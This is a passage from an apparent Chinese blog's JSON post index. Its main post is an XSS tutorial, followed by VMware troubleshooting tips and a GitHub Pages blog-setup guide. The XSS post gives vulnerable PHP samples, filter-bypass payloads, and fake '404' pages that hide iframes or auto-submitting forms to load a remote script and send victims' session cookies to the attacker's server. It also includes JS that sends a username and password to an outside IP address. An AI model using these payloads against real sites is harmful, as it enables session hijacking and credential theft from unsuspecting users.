弹框hack,插入的语句被执行； 数据流向：前端--\u0026gt;后端--\u0026gt;前端   6.2 存储型xss  ------------------------------ //前端：2.html \u0026lt;html\u0026gt; \u0026lt;head lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;存储型XSS\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026quot;action2.php\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt; 输入你的ID： \u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;id\u0026quot; /\u0026gt; \u0026lt;br/\u0026gt; 输入你的Name：\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;name\u0026quot; /\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;提交\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ------------------------------- //后端：action2.php \u0026lt;?php $id=$_POST[\u0026quot;id\u0026quot;]; $name=$_POST[\u0026quot;name\u0026quot;]; mysql_connect(\u0026quot;localhost\u0026quot;,\u0026quot;root\u0026quot;,\u0026quot;root\u0026quot;); mysql_select_db(\u0026quot;test\u0026quot;); $sql=\u0026quot;insert into xss value ($id,'$name')\u0026quot;; $result=mysql_query($sql); ?\u0026gt; ------------------------------ //供其他用户访问页面：show2.php \u0026lt;?php mysql_connect(\u0026quot;localhost\u0026quot;,\u0026quot;root\u0026quot;,\u0026quot;root\u0026quot;); mysql_select_db(\u0026quot;test\u0026quot;); $sql=\u0026quot;select * from xss where id=1\u0026quot;; $result=mysql_query($sql); while($row=mysql_fetch_array($result)){ echo $row['name']; } ?\u0026gt; --------------------------------- 这里有一个用户提交的页面,数据交给后端后,后端存储在数据库中。然后当其他用户 访问另一个页面时,后端调出改数据,显示给另一个用户,XSS代码执行。 ----------------------------------- 我们输入1和\u0026lt;script\u0026gt;alert(\\'hack\\')\u0026lt;/script\u0026gt;,注意,这里的hack的单引号要进行转义, 因为sql语句中的$name是单引号的,所以这里不转义的话就会闭合sql语句中的单引号。 ----------------------------------- 当我们提交1和\u0026lt;script\u0026gt;alert(\\'hack\\')\u0026lt;/script\u0026gt;后,XSS代码被插入数据库, 然后当其他用户访问show2.php时,查询id=1,echo $row['name'],xss代码被执行。 ----------------------------------- 数据流向：前端--\u0026gt;后端--\u0026gt;数据库--\u0026gt;后端--\u0026gt;前端   6.3 DOM-xss  ---------------------------------- // 前端3.html \u0026lt;html\u0026gt; \u0026lt;head lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;DOM型XSS\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026quot;action3.php\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;name\u0026quot; /\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;提交\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ----------------------- // 后端action3.php \u0026lt;?php $name=$_POST[\u0026quot;name\u0026quot;]; ?\u0026gt; \u0026lt;input id=\u0026quot;text\u0026quot; type=\u0026quot;text\u0026quot; value=\u0026quot;\u0026lt;?php echo $name; ?\u0026gt;\u0026quot;/\u0026gt; \u0026lt;div id=\u0026quot;print\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot;\u0026gt; var text=document.getElementById(\u0026quot;text\u0026quot;); var print=document.getElementById(\u0026quot;print\u0026quot;); print.innerHTML=text.value; // 获取 text的值,并且输出在print内。这里是导致xss的主要原因。 \u0026lt;/script\u0026gt; ------------------------------ 这是一个用户提交页面,用户可以在此提交数据,数据提交后给后台处理： ------------------------------ 提交数据：\u0026lt;img src=1 οnerrοr=alert('hack')\u0026gt; ,弹窗hack ------------------------------ 数据流向：前端--\u0026gt;浏览器   7. XSS的简单绕过滤和绕过  ---------------------------------- 1.区分大小写过滤标签： 过滤：$name=preg_replace(\u0026quot;/\u0026lt;script\u0026gt;/\u0026quot;,\u0026quot;\u0026quot;,$name); //过滤\u0026lt;script\u0026gt; $name=preg_replace(\u0026quot;/\u0026lt;\\/script\u0026gt;/\u0026quot;,\u0026quot;\u0026quot;,$name); //过滤\u0026lt;/script\u0026gt; 绕过：可以使用大小写绕过 \u0026lt;scripT\u0026gt;alert('hack')\u0026lt;/scripT\u0026gt; ---------------------------------- 2.不区分大小写过滤标签：/i：不区分大小写 过滤：$name=preg_replace(\u0026quot;/\u0026lt;script\u0026gt;/i\u0026quot;,\u0026quot;\u0026quot;,$name); //不区分大小写过滤 \u0026lt;script\u0026gt; $name=preg_replace(\u0026quot;/\u0026lt;\\/script\u0026gt;/i\u0026quot;,\u0026quot;\u0026quot;,$name); //不区分大小写过滤 \u0026lt;/script\u0026gt; 绕过：可以使用嵌套的script标签绕过：\u0026lt;scr\u0026lt;script\u0026gt;ipt\u0026gt;alert('hack')\u0026lt;/scr\u0026lt;/script\u0026gt;ipt\u0026gt; ---------------------------------- 3.不区分大小写,过滤之间的所有内容： 过滤：$name = preg_replace( '/\u0026lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); //过滤了\u0026lt;script 及其之间的所有内容 绕过：虽然无法使用\u0026lt;script\u0026gt;标签注入XSS代码,但是可以通过img、body等标签的事件 或者iframe等标签的 rc注入恶意的js代码。 \u0026lt;img src=1 οnerrοr=alert('hack')\u0026gt; ------------------------------------   8. 反射型XSS的利用优势 假设现在有一个网站存在反射型XSS,当用户登录该网站时,我们通过诱使用户点击我们精心制作的恶意连接,来盗取用户\n的cookie并返回给我们,然后我们通过盗取的cookie以用户的身份登录该网站。\n ------------------------------------ get型： 当我们的输入参数的请求类型为get型时,即我们的输入参数是以URL方式提交； 该链接的为：http://127.0.0.1/vulnerabilities/xss_r/?name=\u0026lt;script\u0026gt;alert(/xss/)\u0026lt;/script\u0026gt; 思考：怎么构造恶意代码用来诱使用户点击并且用户点击后不会发现点击了恶意链接呢？ -------------------------------- 构造代码： 核心：\u0026lt;iframe src=\u0026quot;http://127.0.0.1/vulnerabilities/xss_r/?name=\u0026lt;script src=https://t.cn/EtxZt8T\u0026gt;\u0026lt;/script\u0026gt;\u0026quot; style=\u0026quot;display:none;\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt; ---------------------------- \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026quot;Content-Type\u0026quot; content=\u0026quot;text/html; charset=UTF-8\u0026quot;\u0026gt; \u0026lt;meta http-equiv=\u0026quot;X-UA-Compatible\u0026quot; content=\u0026quot;IE=edge,chrome=1\u0026quot;\u0026gt; \u0026lt;title\u0026gt;404 页面不存在 \u0026lt;/title\u0026gt; \u0026lt;style type=\u0026quot;text/css\u0026quot;\u0026gt; body{font:14px/1.5 'Microsoft YaHei','微软雅黑',Helvetica,Sans-serif;min-width:1200px;background:#f0f1f3;} .error-page{background:#f0f1f3;padding:80px 0 180px} .error-page-main{position:relative;background:#f9f9f9;margin:0 auto;width:617px;-ms-box-sizing:border-box;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:50px 50px 70px} .error-page-main h3{font-size:24px;font-weight:400;border-bottom:1px solid #d0d0d0} .error-page-main h3 strong{font-size:54px;font-weight:400;margin-right:20px} \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;iframe src=\u0026quot;http://127.0.0.1/vulnerabilities/xss_r/?name=\u0026lt;script src=https://t.cn/EtxZt8T\u0026gt;\u0026lt;/script\u0026gt;\u0026quot; style=\u0026quot;display:none;\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;div class=\u0026quot;error-page\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;error-page-container\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;error-page-main\u0026quot;\u0026gt; \u0026lt;h3\u0026gt; \u0026lt;strong\u0026gt;404\u0026lt;/strong\u0026gt;很抱歉,您要访问的页面不存在！ \u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ------------------------------ 将其保存为html页面,然后放在我们自己的服务器上,作为一个链接。当用户登录了存在漏洞的网站,并且用户点击了 我们构造的恶意链接时,该链接页面会偷偷打开一个iframe框架,iframe会访问其中的链接,然后执行我们的js代码。 该js代码会把存在漏洞的网站的cookie发送到我们的平台上,而用户却浑然不知,只会获得一个404错误页面。 注：我们的攻击代码可以利用的前提是存在XSS漏洞的网站的X-Frame-options未配置,并且会话Cookie没有设置Http Only属性 ======================================= post型 假设一网站的用户名输入框存在反射型XSS漏洞： 构造代码： ------------------------------- \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026quot;Content-Type\u0026quot; content=\u0026quot;text/html; charset=UTF-8\u0026quot;\u0026gt; \u0026lt;meta http-equiv=\u0026quot;X-UA-Compatible\u0026quot; content=\u0026quot;IE=edge,chrome=1\u0026quot;\u0026gt; \u0026lt;title\u0026gt;404 页面不存在 \u0026lt;/title\u0026gt; \u0026lt;style type=\u0026quot;text/css\u0026quot;\u0026gt; body{font:14px/1.5 'Microsoft YaHei','微软雅黑',Helvetica,Sans-serif;min-width:1200px;background:#f0f1f3;} .error-page{background:#f0f1f3;padding:80px 0 180px} .error-page-main{position:relative;background:#f9f9f9;margin:0 auto;width:617px;-ms-box-sizing:border-box;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:50px 50px 70px} .error-page-main h3{font-size:24px;font-weight:400;border-bottom:1px solid #d0d0d0} .error-page-main h3 strong{font-size:54px;font-weight:400;margin-right:20px} \u0026lt;/style\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot;\u0026gt; function attack() { document.getElementById(\u0026quot;transfer\u0026quot;).submit(); } \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;iframe src=\u0026quot;form.html\u0026quot; frameborder=\u0026quot;0\u0026quot; style=\u0026quot;display: none\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;div class=\u0026quot;error-page\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;error-page-container\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;error-page-main\u0026quot;\u0026gt; \u0026lt;h3\u0026gt; \u0026lt;strong\u0026gt;404\u0026lt;/strong\u0026gt;很抱歉,您要访问的页面不存在！ \u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;form method=\u0026quot;POST\u0026quot; id=\u0026quot;transfer\u0026quot; action=\u0026quot;http://127.0.0.1/xss/action.php\u0026quot; target=\u0026quot;frameName\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;username\u0026quot; value=\u0026quot;\u0026lt;script src=https://t.cn/EtxZt8T\u0026gt;\u0026lt;/script\u0026gt;\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;password\u0026quot; value=\u0026quot;1\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;iframe src=\u0026quot;\u0026quot; frameborder=\u0026quot;0\u0026quot; name=\u0026quot;frameName\u0026quot; style=\u0026quot;display: none\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ------------------------------------//form表单target属性：指定框架打开的位置 将其保存为html页面,然后放在我们自己的服务器上,作为一个链接。当用户登录了存在漏洞的网站,并且用户点击了 我们构造的恶意链接时,该链接页面会偷偷打开一个iframe框架,iframe会访问其中的链接,然后执行我们的js代码, 完成表单的提交,表单的用户名参数是我们的js代码。提交完该表单后,该js代码会把存在漏洞的网站的cookie发送到 我们的平台上,单用户却浑然不知,只会获得一个404错误页面。 这里的404页面中隐藏了一个form提交表单,为了防止提交表单后跳转,在表单中添加一个iframe框架,并且iframe框架 的name等于form表单的target,并且设置iframe框架不可见。 当用户点击我们构造的恶意链接时,发现是一个404页面。实际上这个页面偷偷地进行了页面的提交,提交到了我们 指定的平台位置。   9. 利用js将用户信息发送给后台  构造代码： -------------------------------------- \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026quot;https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; $(function(){ //我们现在假如 user和pass是我们利用js获得的用户的用户名和密码 user=\u0026quot;admin\u0026quot;; pass=\u0026quot;root\u0026quot;; url=\u0026quot;http://120.79.74.249:8080/?user=\u0026quot;+user+\u0026quot;\u0026amp;pass=\u0026quot;+pass; var frame=$(\u0026quot;\u0026lt;iframe\u0026gt;\u0026quot;); frame.attr(\u0026quot;src\u0026quot;,url); frame.attr(\u0026quot;style\u0026quot;,\u0026quot;display:none\u0026quot;); $(\u0026quot;#body\u0026quot;).append(frame); //添加一个iframe框架,并设置不显示。这个框架会偷偷访问该链接。 }); \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body id=\u0026quot;body\u0026quot;\u0026gt; \u0026lt;h3\u0026gt;hello,word!\u0026lt;/h3\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ------------------------------------- 当用户访问了该页面,我们后台就可以看到用户访问记录。   ","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/xss%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/","tags":["漏洞原理"],"title":"XSS漏洞详解"},{"content":"报错1 无法打开内核设备“\\.\\VMCIDev\\VMX”: 系统找不到指定的文件。你想要在安装 VMware Workstation 前重启吗?\n这里打开以.vmx结尾的文件，如下图\n搜索 vmci0.present，把后面的 TRUE 替换成 FALSE，如下图：\n再打开就好\n报错2 errors:\n VMware Workstation 不可恢复错误: (vmx)\nException 0xc0000006 (disk error while paging) has occurred.\n日志文件位于“K:\\vmware\\centos\\vmware.log”中。\n您可以请求支持。\n 因为我当时的虚拟机都是处于挂起状态，这里直接给当前虚拟机关机，再启动就好，看了看里面的快照什么的也没有丢失\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/vmware%E6%9B%B4%E6%96%B0%E9%97%AE%E9%A2%98/","tags":["奇奇怪怪的问题"],"title":"关于VMware由15版本更新到16版本的报错问题"},{"content":"教大家如何来使用Github Pages和Gridea来搭建个人博客\n1 关于Github Pages\n来看看官方的介绍：\n GitHub Pages 是一项静态站点托管服务，它直接从 GitHub 上的仓库获取 HTML、CSS 和 JavaScript 文件，（可选）通过构建过程运行文件，然后发布网站。\n emmm，不废话了，总之，GitHub Pages会发布您推送到代码仓库的任何静态文件，你可以创建自己的静态文件或使用静态站点生成器（如Hexo）为你构建站点，然后就可以使用github.io域名访问你的博客网站了。对了，是免费的哦~\n2 关于Gridea\n Gridea 是一个静态博客写作客户端，帮助你更容易地构建并管理博客或任何静态站点。\n Gridea的方便就在于可以使用客户端直接编写代码，然后只要点击按钮就能发布，非常人性化。重要的是，其提供了Windows、Mac OS和Linux三种操作系统的客户端。Gridea的界面是这样的：\n怎么样？是不是非常小清新？是不是迫不及待地想要开始了？！\n3 开始动手吧\n3.1 注册Github账号\n先去全球最大的程序员交友平台——Github上注册一个账号，登录。\n3.2 创建仓库token\n登录后，先进入创建token的页面，然后填写Note（相当于是个提示吧，因为你可能有多个token，便于区分用途），勾上repo即可，往下拉点Generate token。 然后点这个图标先复制，先保存起来吧，不然你下次再点开就看不到了，得重新生成。\n3.3 创建代码仓库\n点击右上角头像左边的+号，然后选择New repository。\n填写好信息，点下面的Create repository。\n 注意：Repository name填你的用户名.github.io，Description不填也行。\n 创建成功后，就是只有一个只有README.md的仓库，这时你就可以在浏览器访问你的用户名.github.io，可以看到下面内容，就可以了。\n3.3 运行Gridea\n去Gridea的官网下载你操作系统对应的安装包，安装，运行。第一次使用要进行配置，点击远程进行配置。\n 平台要选Github Pages，域名和仓库名称填你的用户名.github.io，分支填master，令牌就是刚刚要你复制的token。另外你要绑定域名的话，CNAME就填你的域名。\n 填写完成后，点保存，然后监测一下远程连接，没问题的话就点左下角的同步。\n这样你就可以访问你的用户名.github.io来打开你的博客网站了，如果你设置了CNAME，就是访问你的域名。文章的管理就可以直接在这个客户端上操作，同时也可以选择你喜欢的主题，自己多去研究研究吧，哈哈。另外，附上一些答疑。\n大家可以看到，我写的这个教程主要是发的截图，根本不需要写代码，这就是使用Gridea的好处。\nOK，接下来你就自己去折腾你的博客吧\n本文转载自：https://zhuanlan.zhihu.com/p/165948546\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/gridea%E6%90%AD%E5%8D%9A%E5%AE%A2/","tags":["博客搭建"],"title":"完全小白教程：使用Github Pages和Gridea搭建个人博客"}]